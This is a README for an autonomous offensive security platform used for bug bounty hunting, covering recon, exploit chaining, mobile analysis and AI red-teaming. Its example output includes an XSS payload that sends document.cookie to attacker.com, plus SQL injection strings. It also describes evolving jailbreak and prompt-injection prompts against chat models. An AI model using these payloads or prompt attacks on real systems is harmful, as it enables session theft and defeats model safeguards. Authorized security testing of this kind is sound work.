<p align="center">
  <h1 align="center">🛡️ One&Infinity</h1>
  <p align="center"><b>Autonomous Offensive Security Research Platform</b></p>
  <p align="center">
    Graph-driven attack orchestration · Multi-agent exploit chaining · AI red teaming · Mobile security analysis
  </p>
</p>

<p align="center">
  <img src="https://img.shields.io/github/stars/Inf1n1tyDeS0ul/oneinfinity?style=flat-square&color=yellow" alt="Stars">
  <img src="https://img.shields.io/github/forks/Inf1n1tyDeS0ul/oneinfinity?style=flat-square&color=blue" alt="Forks">
  <img src="https://img.shields.io/badge/License-MIT-green?style=flat-square" alt="License">
  <img src="https://img.shields.io/badge/Status-Active-brightgreen?style=flat-square" alt="Status">
  <img src="https://img.shields.io/badge/Python-3.10%2B-blue?style=flat-square&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/AI-Autonomous-red?style=flat-square" alt="AI">
  <img src="https://img.shields.io/badge/Security-Offensive-black?style=flat-square" alt="Offensive">
  <img src="https://img.shields.io/badge/Scope-Authorized%20Use%20Only-orange?style=flat-square" alt="Authorized">
  <img src="https://img.shields.io/badge/Docker-Ready-2496ED?style=flat-square&logo=docker" alt="Docker">
  <img src="https://img.shields.io/badge/Distributed-Workers-purple?style=flat-square" alt="Distributed">
</p>

---

## What is One&Infinity?

One&Infinity is an **autonomous offensive security research platform** built for bug bounty hunters, red teamers, and security researchers who need more than a scanner.

Most tools identify vulnerabilities in isolation. One&Infinity connects them — building an attack graph of your target, letting an AI decision engine prioritize nodes, dispatching specialized agents, chaining findings into multi-step exploit paths, eliminating false positives through active validation, and learning from every result to improve the next scan.

**In concrete terms:**
- A subdomain found by `subfinder` becomes a node in the attack graph
- Nuclei finds an open redirect on that node
- The exploit chain engine links it to an OAuth token being used in a CORS response
- The swarm coordinator dispatches the Auth agent to test for account takeover
- The validation engine confirms the chain is exploitable
- A HackerOne-ready report is generated, including estimated bounty payout

That sequence runs autonomously. No manual pivoting. No copy-pasting between tools.

---

## 🔥 Why Not Just Use Nuclei / Burp / SQLMap?

| Capability | Individual Tools | One&Infinity |
|---|---|---|
| Vulnerability scanning | ✅ Template-based | ✅ Template + adaptive |
| Cross-tool correlation | ❌ Manual | ✅ Automatic via attack graph |
| Exploit chaining | ❌ | ✅ 6 chain patterns, step-by-step PoC |
| False positive filtering | ❌ | ✅ Canary validation, endpoint liveness, CVSS gating |
| AI red teaming | ❌ | ✅ 800+ templates, genetic mutation, 6 attack categories |
| Mobile security | Partial (MobSF alone) | ✅ 12-phase pipeline, Frida script gen, API attack engine |
| Learning / adaptive planning | ❌ | ✅ EMA per-vuln-type success tracking (α=0.30) |
| Autonomous multi-target hunting | ❌ | ✅ discover → prioritize → scan → report, unattended |
| Bug bounty report generation | ❌ | ✅ H1 / Bugcrowd / Intigriti markdown, with bounty estimate |
| Distributed scanning | ❌ | ✅ Redis-backed worker swarm, horizontally scalable |
| Containerized deployment | Partial | ✅ Multi-stage Docker image, distributed docker-compose |

---

## 🚀 Quick Start

### Docker (Recommended)

No Go toolchain, no Python venv, no tool installation — everything is baked into the image.

```bash
git clone https://github.com/Inf1n1tyDeS0ul/oneinfinity.git
cd oneinfinity
make setup          # creates .env from .env.example + data/ dirs
# Edit .env — set ONEINFINITY_API_KEY and any AI provider keys
make build && make up
```

The full distributed stack (API, Redis, workers, nginx, Grafana) starts at `http://localhost`.
Submit a scan from the CLI or the web dashboard:

```bash
make scan T=example.com          # full scan via API
make recon T=example.com         # recon only
make scale-recon N=4             # scale recon workers to 4
make workers-status              # inspect registered workers
```

For a single-container CLI workflow:

```bash
docker run --rm \
  -v ~/.oneinfinity:/data \
  -e ONEINFINITY_API_KEY=<key> \
  ghcr.io/inf1n1tydes0ul/oneinfinity:latest \
  scan example.com --yes
```

See [DOCKER.md](DOCKER.md) for the full Docker reference.

### Native Python

```bash
# Clone
git clone https://github.com/Inf1n1tyDeS0ul/oneinfinity.git
cd oneinfinity

# Python environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Web backend (optional)
cd web/backend && pip install -r requirements.txt && python3 main.py &

# Web frontend (optional)
cd web/frontend && npm install && npm run dev
```

> **Minimum:** Python 3.10+, Go 1.21+ (for Go-based tool wrappers), Node 18+ (for web UI only).
> Most core scanning workflows run without the web UI.

---

## ⚡ Core Features

### 🕸️ Recon & Intelligence

- **Subdomain enumeration** — subfinder, amass, assetfinder, findomain, dnsx in a single coordinated phase
- **Certificate transparency monitoring** — crt.sh passive monitoring plugin
- **ASN / IP range enumeration** — BGP/ASN API-based IP block discovery
- **HTTP probing & fingerprinting** — httpx, naabu, whatweb with technology detection
- **JS endpoint extraction** — katana + regex extraction from live JavaScript files
- **Cloud asset discovery** — DNS patterns and CIDR matching for AWS, GCP, Azure assets
- **OSINT collection** — HackerTarget, DNSDumpster, URLScan, Wayback Machine, GitHub dorks, Shodan
- **Org-domain intelligence** — maps a GitHub organization to its likely domains via public repo metadata
- **Port scanning** — naabu fast scan + targeted nmap service detection
- **Web crawling** — katana, hakrawler, gauplus, waybackurls with dedup

### 🔍 Vulnerability Detection

- **Template scanning** — Nuclei v3 with `-jsonl` output, structured result ingestion
- **XSS** — dalfox, kxss, XSStrike; reflected + stored + DOM
- **SQL injection** — sqlmap, commix; error-based, union, time-blind
- **CRLF injection** — crlfuzz
- **Secret scanning** — trufflehog, gitleaks, jwt_tool; binary DEX scanning for mobile
- **S3 misconfiguration** — s3scanner
- **Directory / path fuzzing** — ffuf, gobuster, dirsearch with wordlist auto-selection
- **Parameter discovery** — arjun, gf (pattern-based endpoint filtering)
- **API security** — GraphQL introspection, BOLA, mass assignment, rate limit bypass, version bypass
- **Cloud misconfiguration** — S3, Elasticsearch, Kubernetes, credential leakage checks
- **Business logic** — price manipulation, coupon stacking, workflow bypass, race conditions
- **Anomaly / zero-day detection** — timing fingerprints, status differentials, reflection leakage

### 🔗 Exploit Chaining Engine

Six canonical multi-step chain patterns — each detects qualifying findings, constructs a step-by-step PoC, and generates a structured report:

| Chain | Entry | Pivot | Impact |
|---|---|---|---|
| `ssrf_to_cloud_metadata` | SSRF | Cloud metadata endpoint | IAM credential theft |
| `xss_to_ato` | Stored/Reflected XSS | Victim session | Account takeover |
| `sqli_to_rce` | SQLi (error/union/time) | File write / UDF | Remote code execution |
| `idor_to_priv_esc` | IDOR | Sensitive object | Privilege escalation |
| `cors_to_credential_theft` | CORS misconfiguration | Authenticated endpoint | Credential exfiltration |
| `open_redirect_to_oauth_hijack` | Open redirect | OAuth `redirect_uri` | OAuth token hijack |

Each chain is detected automatically when confirmed findings match the trigger criteria. The PoC generator selects the best-match finding per step (not just the trigger finding), producing accurate, executable scripts.

### ✅ Validation Engine (False Positive Killer)

Every finding passes through a two-stage validation pipeline before reaching a report:

**Stage 1 — Active re-testing** (`finding_validation_engine.py`):
- **XSS** — canary `<img>` injection with unique token verification (≈90% accuracy)
- **SQLi error-based** — response differential on injected syntax error (≈85% accuracy)
- **SQLi time-blind** — 4-second threshold timing verification (≈70% accuracy, conservative)
- **SSRF** — out-of-band callback validation via collaborator-style endpoints
- **LFI** — `/etc/passwd` and `/etc/hosts` content pattern matching
- **Auth bypass** — response code + body length differential
- **SSTI** — arithmetic canary (`49` from `7*7`) in response body
- **Open redirect** — location header destination verification

**Stage 2 — Confidence classification** (`core/finding_validator.py` — `FindingClassifier`):

Classifies every finding into one of four buckets before it reaches a report:

| Status | Criteria | Report Included |
|--------|----------|----------------|
| `confirmed` | confidence ≥ 0.70 + evidence/payload present | ✅ Yes |
| `unverified` | confidence 0.35–0.69 | ✅ Yes (marked) |
| `false_positive` | confidence < 0.35 | ❌ Excluded |
| `simulated` | source_type = simulated | ❌ Excluded |

AI-theory findings (tagged `source_type: ai_theory`) are automatically capped at `unverified` and require independent tool confirmation before appearing in a submitted report. Each finding in the report includes an exact CLI reproduction command (`oneinfinity vuln-scan --target <url> --xss --payload "..."`) generated by `ReproducibilityMapper`.

The deduplication engine uses SHA-256 fingerprints of `(vuln_type, normalized_url, parameter)` — tool-agnostic, so dalfox and nuclei finding the same XSS produces one finding, not two.

### 🧠 Attack Graph Engine

```
Assets (subdomains, IPs, endpoints, parameters)
  → Nodes in weighted directed graph
    → 15 trigger rules fire automatically on graph updates
      → Risk scoring: type_weight × connectivity × vuln_bonus × tested_discount
        → BFS path finding from entry nodes to high-impact targets
          → Attacker path simulation with step-by-step lateral movement
```

The attack graph drives the AI decision engine — nodes with high unexplored connectivity and known vulnerability types get dispatched to specialist agents first. The graph exports to JSON, DOT, and SVG formats, and is visualized in the web UI with ForceGraph2D (glow/pulse, NodeInfoPanel, RiskPanel).

### 🐝 Swarm Intelligence

Eight specialized agents run in parallel, each with its own hypothesis generation loop and EMA-tracked success rates:

| Agent | Tools | Collaboration Trigger |
|---|---|---|
| XSS | dalfox, kxss | XSS finding → dispatches Auth agent |
| SQLi | sqlmap, commix | SQLi finding → dispatches IDOR agent |
| SSRF | nuclei SSRF templates | SSRF finding → dispatches IDOR agent |
| IDOR | nuclei, ffuf ID enumeration | — |
| Auth Bypass | jwt_tool, nuclei auth templates | — |
| Business Logic | BusinessLogicEngine, nuclei logic templates | — |
| API Security | GraphQL, BOLA, mass assignment | — |
| Mobile Security | 12-phase mobile pipeline | — |

Agent collaboration is rule-based and automatic — a confirmed SQLi triggers the IDOR agent because object access often becomes reachable after DB read escalation.

### 🔒 Secret Intelligence Pipeline (9 Phases)

1. **Scope resolution** — target domain → GitHub dork queries
2. **GitHub dorking** — code search with org-aware rate limiting (token rotation, EMA quota tracking)
3. **URL deduplication** — SHA-256 fingerprint dedup before fetching
4. **Org graph mapping** — GitHub org → domain → first-party vs. third-party attribution
5. **Content fetch + detection** — adaptive entropy thresholds, 32 regex patterns, DEX binary scanning
6. **Finding deduplication** — cross-repo dedup on `(secret_type, value_hash)`
7. **Live validation** — read-only API calls with 3-second timeout; Redis, AWS, GitHub, Stripe checks
8. **AI triage** — severity matrix: `ownership_confidence × live_verified × prod_context`
9. **Normalization** — raw value stripped after scoring; ownership, confidence, reason persisted

Production context (`prod/live` in code path) prevents severity tier-down for high-specificity secret types (AWS keys, GitHub PATs). Generic keys in a production context get a tier-up from `low` to `medium`.

### 📱 Mobile Security (12-Phase Pipeline)

```bash
python3 oneinfinity.py mobile-analyze <apk_id>
```

| Phase | Engine | What It Does |
|---|---|---|
| Upload + dedup | `mobile_upload_manager.py` | SHA-256 dedup, SQLite metadata |
| Static analysis | APKTool + JADX + MobSF | Manifest, 24 dangerous permissions, 14 code vuln patterns |
| AI reverse engineering | `mobile_ai_reverse_engineer.py` | Hidden endpoints, auth flaws, hardcoded secrets via 14 rule patterns |
| Frida script generation | `frida_script_generator.py` | Auto-generates SSL bypass, root bypass, auth/crypto/network hooks |
| Secret detection | TruffleHog + Gitleaks + DEX binary scan | Keys, tokens, credentials in APK binary and decompiled source |
| API discovery | Retrofit / OkHttp / URLSession / GraphQL | Extracts live API endpoint list for further scanning |
| Component testing | Drozer + androguard + manifest parser | Exported activities, content providers, IPC security |
| Dynamic analysis | Frida + Objection + RMS | SSL bypass verification, root bypass, keystore inspection |
| Network analysis | Static URL scan + Burp proxy | Certificate pinning, cleartext traffic, proxy integration |
| API attack testing | `mobile_api_attack_engine.py` | IDOR, auth bypass, mass assignment, injection on discovered APIs |

### 🤖 AI Security Testing

```bash
python3 oneinfinity.py ai-test <target> --all
python3 oneinfinity.py ai-redteam <target> --campaign jailbreak --prompts 5000
python3 oneinfinity.py ai-agent-test <target> --all
```

- **800+ prompt templates** across 6 attack categories (jailbreak, prompt injection, data exfiltration, RAG poisoning, agent abuse, model inversion)
- **18 mutation strategies** — base64, unicode, HTML entity, role reversal, nested context, instruction camouflage, etc.
- **Genetic algorithm evolution** — prompts that achieve partial compliance are mutated and crossed for next-generation variants
- **Agentic system testing** — tool-call injection, API abuse, sandboxed data exfiltration detection
- **Framework integration** — Garak, PyRIT, Giskard, Purple Llama, Rebuff, IBM ART

### 🔄 Adaptive Learning System

- Per-vulnerability-type success rates tracked with EMA (α=0.30), persisted to `evolution.db`
- Scan approach adjusts based on historical KB — high-yield tech stacks get deeper coverage on repeat visits
- Pattern miner extracts `VulnPattern` / `TargetInsight` objects from every completed scan
- Monte Carlo attack simulation (N=200 Bernoulli trials, 23-path catalog, 6 probability factors) recommends optimal attack strategy per target profile
- **Cross-run persistent memory** (`learning/persistent_memory.py`) — JSON-backed intelligence store survives individual scan runs: successful payloads ranked by hit count, failed payloads avoided, high-value hosts re-prioritized, successful exploit chains replayed. Payload boost scores influence future scan ordering automatically.

### 📊 Bug Bounty Automation

```bash
python3 oneinfinity.py hunter-start                              # fully autonomous
python3 oneinfinity.py hunter-scan <target>                      # directed single-target
python3 oneinfinity.py hunter-start --strategy aggressive        # broad+fast mode
python3 oneinfinity.py hunter-start --strategy stealthy          # evasive, 1 worker
python3 oneinfinity.py hunter-start --strategy high-value        # auth/API/payment ROI focus
python3 oneinfinity.py hunter-start --benchmark-ref burp.json    # post-hunt accuracy comparison
```

- Fetches live programs from HackerOne, Bugcrowd, Intigriti
- Scores targets on 6 dimensions: technology risk, cloud exposure, sensitive path density, historical bounty data, scope breadth, asset age
- **ROI strategy engine** (`core/bounty_strategy_engine.py`) re-ranks URLs by attack value before scanning: auth/payment/API paths scored up; static assets scored down; fintech/banking targets multiplied by 1.4×
- **Elite hunting modes**: `aggressive` (8 workers, broad coverage), `stealthy` (1 worker, human-paced delays, ban-evading), `high-value` (filters to auth/API/payment targets, full exploit chaining)
- **Post-hunt benchmarking** (`--benchmark-ref`) compares findings against a Burp/Nuclei reference file and emits precision/recall/F1 metrics
- Generates platform-specific reports (H1 / Bugcrowd / Intigriti) with CVSS 3.1, evidence blocks, and exact CLI reproduction commands per finding
- Bounty ROI engine estimates payout range per finding type, ranks portfolio by expected yield

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                          INPUT LAYER                                │
│  CLI (55 commands)  ·  Web UI (React, 14 pages)  ·  API (54 routes)│
└───────────────────────────┬─────────────────────────────────────────┘
                            │
┌───────────────────────────▼─────────────────────────────────────────┐
│                        RECON LAYER                                  │
│  subfinder · amass · httpx · katana · waybackurls · naabu · dnsx   │
│  OSINT collector · org-intel mapper · ASN/cert-transparency plugins │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ findings → recon assets
┌───────────────────────────▼─────────────────────────────────────────┐
│                     ATTACK GRAPH ENGINE                             │
│  Nodes (subdomains, endpoints, parameters, credentials, services)   │
│  Edges (resolves-to, hosts, param-of, used-by)                      │
│  15 trigger rules · BFS path finder · Risk scorer                  │
│  PathSimulator · ForceGraph2D visualization                         │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ prioritized node queue
┌───────────────────────────▼─────────────────────────────────────────┐
│                   AI DECISION ENGINE                                │
│  AutonomousDecisionEngine · GraphTriggerEngine                      │
│  Scoring: impact × exploitability × novelty / effort × penalty     │
│  Agent outcome feedback loop (EMA per agent)                        │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ (node, agent) dispatch pairs
┌───────────────────────────▼─────────────────────────────────────────┐
│                     AGENT SWARM (8 agents)                          │
│  XSS · SQLi · SSRF · IDOR · Auth · BizLogic · API · Mobile         │
│  Each agent: hypothesis gen → tool execution → result ingest        │
│  Cross-agent collaboration rules (SQLi→IDOR, SSRF→IDOR, XSS→Auth)  │
└───────────────────────────┬─────────────────────────────────────────┘
                            │ raw findings
┌───────────────────────────▼─────────────────────────────────────────┐
│               RESULT INGESTION ENGINE (singleton)                   │
│  Normalize → SHA-256 dedup → atomic check-and-store (WAL SQLite)   │
│  Broadcast to: attack graph · exploit chain engine · web UI (SSE)  │
└───────────┬───────────────────────────────┬─────────────────────────┘
            │                               │
┌───────────▼──────────┐       ┌────────────▼──────────────────────────┐
│  VALIDATION ENGINE   │       │     EXPLOIT CHAIN ENGINE              │
│  Per-type active     │       │  6 patterns (SSRF→Cloud, XSS→ATO,    │
│  re-testing          │       │  SQLi→RCE, IDOR→PrivEsc,             │
│  CVSS gating         │       │  CORS→CredTheft, Redirect→OAuth)     │
│  FP quarantine       │       │  Step-best-match PoC generation       │
└───────────┬──────────┘       └────────────┬──────────────────────────┘
            │                               │
┌───────────▼───────────────────────────────▼─────────────────────────┐
│                         OUTPUT LAYER                                │
│  Findings DB (SQLite WAL)  ·  JSON / Markdown / HTML / CSV export  │
│  H1 / Bugcrowd / Intigriti reports  ·  CVSS 3.1  ·  Bounty ROI    │
└───────────────────────────┬─────────────────────────────────────────┘
                            │
┌───────────────────────────▼─────────────────────────────────────────┐
│                       LEARNING LAYER                                │
│  KnowledgeBase (SQLite) · AdaptivePlanner · PatternMiner           │
│  EMA success rates · CapabilitySnapshot · MemoryManager            │
│  Auto-updates ARCHITECTURE.md / SKILLS.md on FEATURE_ADDED events  │
└─────────────────────────────────────────────────────────────────────┘
```

**Design principles:**
- **Event-driven** — `ResultIngestionEngine` broadcasts every new finding to all subscribers (attack graph, chain engine, web UI SSE stream, learning layer) without coupling between subsystems
- **Atomic deduplication** — SHA-256 fingerprint check + DB write happen inside a single `threading.Lock()` acquisition (no TOCTOU race)
- **Singleton ingestion** — one DB connection pool, one broadcast channel across all concurrent scan phases
- **Simulate-only audit** — the doctor health check uses simulation mode; no live class instantiation that would require constructor arguments

---

## ⚙️ Installation

### Prerequisites

| Dependency | Version | Purpose |
|---|---|---|
| Python | 3.10+ | Core platform |
| Go | 1.21+ | go-based security tools |
| Node.js | 18+ | Web UI only |
| Git | Any | Tool installation |

### Core Setup

```bash
git clone https://github.com/Inf1n1tyDeS0ul/oneinfinity.git
cd oneinfinity
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Go Tools (Recommended)

```bash
# Reconnaissance
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/projectdiscovery/naabu/cmd/naabu@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Vulnerability scanning
go install github.com/hahwul/dalfox/v2@latest
go install github.com/Emoe/kxss@latest
go install github.com/dwisiswant0/crlfuzz@latest
go install github.com/ffuf/ffuf/v2@latest
go install github.com/OJ/gobuster/v3@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/hakluke/hakrawler@latest
```

### Python Tools

```bash
pip install arjun s3scanner
git clone https://github.com/sqlmapproject/sqlmap.git ~/.local/sqlmap
git clone https://github.com/s0md3v/XSStrike.git ~/.local/xssstrike
git clone https://github.com/OWASP/jwt_toolkit.git ~/.local/jwt_tool
```

### Web UI (Optional)

```bash
# Terminal 1: backend
cd web/backend
pip install -r requirements.txt
python3 main.py

# Terminal 2: frontend
cd web/frontend
npm install
npm run dev
# → http://localhost:3000
```

### System Health Check

```bash
python3 oneinfinity.py doctor
# → Health Score: 10.0 / 10.0 (Healthy)
# → Working: 99 | Partial: 0 | Broken: 0
```

---

## 🧪 Usage

### Directed Scan

```bash
# Interactive — generates a recon plan for review before execution
python3 oneinfinity.py scan example.com

# Autonomous — executes all 7 phases immediately
python3 oneinfinity.py scan example.com --yes

# With specific scan profile
python3 oneinfinity.py profile run deep --target example.com
python3 oneinfinity.py profile run stealth --target example.com
```

### Autonomous Bounty Hunting

```bash
# Discover live programs, prioritize targets, scan, report — unattended
python3 oneinfinity.py hunter-start

# Single-target with full 7-phase pipeline
python3 oneinfinity.py hunter-scan example.com

# Multi-target parallel scan from file
python3 oneinfinity.py swarm targets.txt
```

### Attack Graph

```bash
# Build and analyze graph
python3 oneinfinity.py attack-graph example.com

# Export graph (json | dot | svg)
python3 oneinfinity.py attack-graph-export example.com json

# Graph-driven AI brain (starts the full autonomous loop)
python3 oneinfinity.py brain-start example.com
python3 oneinfinity.py brain-status
python3 oneinfinity.py brain-decide example.com
```

### Research & Zero-Day Mode

```bash
# Build application model → generate vulnerability theories → execute tests
python3 oneinfinity.py research example.com --yes

# Step-by-step
python3 oneinfinity.py analyze-app example.com
python3 oneinfinity.py generate-theories example.com
python3 oneinfinity.py run-custom-tests example.com
python3 oneinfinity.py zero-day example.com
```

### Exploit Chains

```bash
# Detect chains from existing confirmed findings
python3 oneinfinity.py exploit example.com

# Generate report alongside PoC
python3 oneinfinity.py exploit example.com --report

# Replay a captured HTTP request with payload permutations
python3 oneinfinity.py replay-request <request_id>
python3 oneinfinity.py replay-request <request_id> --payload "' OR 1=1--"
```

### Secret Intelligence

```bash
# 9-phase secret hunt for a domain
python3 oneinfinity.py secret-hunt example.com

# Org-domain intelligence (OSINT only, no scanning)
python3 oneinfinity.py org-intel myorg --output org_intel.json
```

### Mobile Security

```bash
# Upload APK (SHA-256 dedup, returns apk_id)
python3 oneinfinity.py mobile-upload target.apk

# Full 12-phase analysis
python3 oneinfinity.py mobile-analyze <apk_id>

# Individual phases
python3 oneinfinity.py mobile-static <apk_id>
python3 oneinfinity.py mobile-dynamic <apk_id>
python3 oneinfinity.py mobile-api <apk_id>
```

### AI Security Testing

```bash
# Full AI model security scan
python3 oneinfinity.py ai-test https://api.example.com/chat --all

# Targeted tools
python3 oneinfinity.py ai-test https://api.example.com/chat --garak
python3 oneinfinity.py ai-test https://api.example.com/chat --pyrit

# Red team campaign with genetic prompt evolution
python3 oneinfinity.py ai-redteam https://api.example.com/chat \
  --campaign jailbreak --prompts 5000

# Agentic system testing (tool abuse, prompt injection, data exfiltration)
python3 oneinfinity.py ai-agent-test https://api.example.com --all
```

### Event-Driven Daemon

```bash
# Start always-on daemon with 9 background workers
python3 oneinfinity.py daemon-start example.com

# Monitor
python3 oneinfinity.py daemon-status

# Add target without restart
python3 oneinfinity.py daemon-add-target sub.example.com

# Stop
python3 oneinfinity.py daemon-stop
```

### Findings & Reporting

```bash
# Browse findings
python3 oneinfinity.py findings
python3 oneinfinity.py findings --severity high,critical
python3 oneinfinity.py findings export json
python3 oneinfinity.py findings export csv

# Generate platform-specific report
python3 oneinfinity.py report --finding <id>         # auto-detects platform
python3 oneinfinity.py report chain <id1> <id2>       # combined chain report

# CVSS calculation
python3 oneinfinity.py cvss "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
```

### Diagnostics

```bash
python3 oneinfinity.py doctor               # standard (simulate mode)
python3 oneinfinity.py doctor --deep        # deeper QA scenario coverage
python3 oneinfinity.py doctor --json        # machine-readable output
```

---

## 📂 Project Structure

```
oneinfinity/
│
├── oneinfinity.py                  # CLI entry point (55 commands)
│
├── ── AUTONOMOUS PIPELINE ──────────────────────────────────────────
├── autonomous_scan_pipeline.py     # 7-phase orchestrator
├── bounty_hunter_engine.py         # Multi-target autonomous hunter
├── program_discovery_engine.py     # Live H1/Bugcrowd/Intigriti program fetch
├── target_prioritization_engine.py # 6-dimension weighted target scoring
│
├── ── CORE ENGINES ─────────────────────────────────────────────────
├── adaptive_recon_engine.py        # Technology detection, JS endpoints, cloud assets
├── application_intelligence.py     # AppModel: auth flows, API map, roles
├── vulnerability_theory_engine.py  # 23-rule hypothesis generator
├── finding_validation_engine.py    # False-positive filtering, active re-testing
├── result_ingestion_engine.py      # Singleton: normalize → dedup → persist → broadcast
├── exploit_generator.py            # 130+ payloads across 12 vuln types
├── bounty_report_generator.py      # H1/Bugcrowd/Intigriti report generator
│
├── ── INTELLIGENCE ─────────────────────────────────────────────────
├── attack_graph_brain.py           # Graph-driven autonomous loop controller
├── autonomous_decision_engine.py   # AI decision engine with outcome feedback
├── graph_trigger_engine.py         # 15 rule-based graph triggers
├── intelligence_daemon.py          # Always-on 9-worker event daemon
├── swarm_intelligence_engine.py    # 8-agent parallel swarm + coordinator
│
├── ── AI & MOBILE ──────────────────────────────────────────────────
├── ai_security_engine.py           # AI scan orchestrator
├── ai_redteam_engine.py            # Red team + genetic prompt evolution
├── mobile_security_engine.py       # 12-phase mobile pipeline
│
├── ── SUBSYSTEMS ───────────────────────────────────────────────────
├── agents/                         # Multi-agent layer (recon/scan/exploit/validate/report)
├── modules/                        # Tool wrappers, pipeline primitives, findings DB
├── core/                           # Infrastructure: dedup, cache, scope, profiles, doctor
├── exploit_chains/                 # Chain patterns, PoC generator, detection engine
├── attack_graph/                   # Graph model, builder, analyzer, path simulator
├── ai_security/                    # AI vuln detectors, prompt generators, tool wrappers
├── learning/                       # AdaptivePlanner, KnowledgeBase, PatternMiner
├── framework/                      # OWASP framework orchestrator
├── plugins/                        # Extensible plugin system (recon, vuln)
│
└── web/                            # React web platform
    ├── backend/                    # FastAPI backend (54 routes)
    └── frontend/                   # React UI (14 pages, SSE live stream)
```

---

## 📊 Output Examples

### Finding (JSON)

```json
{
  "id": "f3a9c2d1",
  "vuln_type": "xss",
  "severity": "high",
  "cvss": 8.1,
  "url": "https://example.com/search",
  "parameter": "q",
  "payload": "<img src=x onerror=alert(document.cookie)>",
  "validated": true,
  "validation_method": "canary_reflection",
  "tool": "dalfox",
  "scan_id": "scan_20260319_001",
  "created_at": "2026-03-19T14:22:01Z",
  "chain_eligible": true,
  "chain_pattern": "xss_to_ato"
}
```

### Exploit Chain (JSON)

```json
{
  "chain_id": "chain_xss_ato_001",
  "pattern": "xss_to_ato",
  "severity": "critical",
  "steps": [
    {
      "step": "xss",
      "url": "https://example.com/search?q=<payload>",
      "payload": "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
      "result": "session cookie exfiltrated"
    },
    {
      "step": "session_hijack",
      "url": "https://example.com/account",
      "method": "Cookie header injection with stolen token",
      "result": "full account access"
    }
  ],
  "poc_script": "# Full executable PoC omitted — available in report",
  "bounty_estimate": "$2,000 – $5,000",
  "report_format": "hackerone"
}
```

### Doctor Output

```
Health Score: 🟢 10.0 / 10.0 (Healthy)
  ✅ Working: 99
  ⚠️  Partial: 0
  ❌ Broken:  0

QA Scenarios:  34 pass / 0 fail
Regressions:   None detected
Tools checked: 34 installed / 6 optional missing
```

---

## 🔐 Security & Safety

### Scope Enforcement

Every tool wrapper validates the target against the configured scope before execution. Scope is defined in `scope.yaml` and supports:
- Exact domains and subdomains
- Wildcard rules (`*.example.com`)
- CIDR ranges (`10.0.0.0/8`)
- Always-out-of-scope list (permanently blocked domains/IPs)

Every scope decision is written to an audit log. No request is sent to an out-of-scope target — the check runs before the tool subprocess starts.

### Rate Limiting

Built-in per-domain rate limiting in `modules/scripter.py`. GitHub API requests use a token rotation pool with EMA quota tracking. All HTTP clients use configurable timeouts and retry budgets.

### Data Safety

- Secret raw values are stripped after scoring and **never** persisted to the findings database
- Live secret validation uses read-only API calls (no write, no delete, 3-second timeout)
- Hardcoded credentials are explicitly rejected in all configuration paths

### Safe Execution Profiles

| Profile | Noise Level | Use Case |
|---|---|---|
| `stealth` | Minimal | Rate-limited, low-frequency requests |
| `quick` | Low | Fast surface-level check |
| `deep` | High | Full tool suite, longer timeouts |
| `research` | High | Theory generation + custom tests |
| `swarm` | Very high | Multi-target parallel; use with caution |

---

## 🙏 Credits & Acknowledgements

One&Infinity is built on top of an ecosystem of world-class open-source security tools. We integrate but do not claim ownership of any of the following:

### Reconnaissance & Scanning
| Tool | Author / Organization | License |
|---|---|---|
| [Nuclei](https://github.com/projectdiscovery/nuclei) | ProjectDiscovery | MIT |
| [Subfinder](https://github.com/projectdiscovery/subfinder) | ProjectDiscovery | MIT |
| [Httpx](https://github.com/projectdiscovery/httpx) | ProjectDiscovery | MIT |
| [Dnsx](https://github.com/projectdiscovery/dnsx) | ProjectDiscovery | MIT |
| [Naabu](https://github.com/projectdiscovery/naabu) | ProjectDiscovery | MIT |
| [Katana](https://github.com/projectdiscovery/katana) | ProjectDiscovery | MIT |
| [Amass](https://github.com/owasp-amass/amass) | OWASP | Apache 2.0 |
| [Assetfinder](https://github.com/tomnomnom/assetfinder) | Tom Hudson | MIT |
| [Findomain](https://github.com/findomain/findomain) | Edu4rdSHL | GPL-3.0 |
| [Waybackurls](https://github.com/tomnomnom/waybackurls) | Tom Hudson | MIT |
| [Gauplus](https://github.com/bp0lr/gauplus) | bp0lr | MIT |
| [Hakrawler](https://github.com/hakluke/hakrawler) | hakluke | MIT |

### Vulnerability Testing
| Tool | Author / Organization | License |
|---|---|---|
| [Dalfox](https://github.com/hahwul/dalfox) | hahwul | MIT |
| [Kxss](https://github.com/Emoe/kxss) | Emoe | — |
| [XSStrike](https://github.com/s0md3v/XSStrike) | s0md3v | GPL-3.0 |
| [SQLMap](https://github.com/sqlmapproject/sqlmap) | sqlmapproject | GPL-2.0 |
| [Commix](https://github.com/commixproject/commix) | commixproject | GPL-3.0 |
| [CRLFuzz](https://github.com/dwisiswant0/crlfuzz) | dwisiswant0 | MIT |
| [FFuf](https://github.com/ffuf/ffuf) | joohoi | MIT |
| [Gobuster](https://github.com/OJ/gobuster) | OJ Reeves | Apache 2.0 |
| [Dirsearch](https://github.com/maurosoria/dirsearch) | maurosoria | GPL-2.0 |
| [Arjun](https://github.com/s0md3v/Arjun) | s0md3v | GPL-3.0 |
| [GF](https://github.com/tomnomnom/gf) | Tom Hudson | MIT |
| [JWT Tool](https://github.com/ticarpi/jwt_tool) | ticarpi | GPL-3.0 |
| [Nikto](https://github.com/sullo/nikto) | sullo | GPL-2.0 |

### Secret Detection
| Tool | Author / Organization | License |
|---|---|---|
| [TruffleHog](https://github.com/trufflesecurity/trufflehog) | TruffleHog | AGPL-3.0 |
| [Gitleaks](https://github.com/gitleaks/gitleaks) | zricethezav | MIT |

### Mobile Security
| Tool | Author / Organization | License |
|---|---|---|
| [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | MobSF Project | GPL-3.0 |
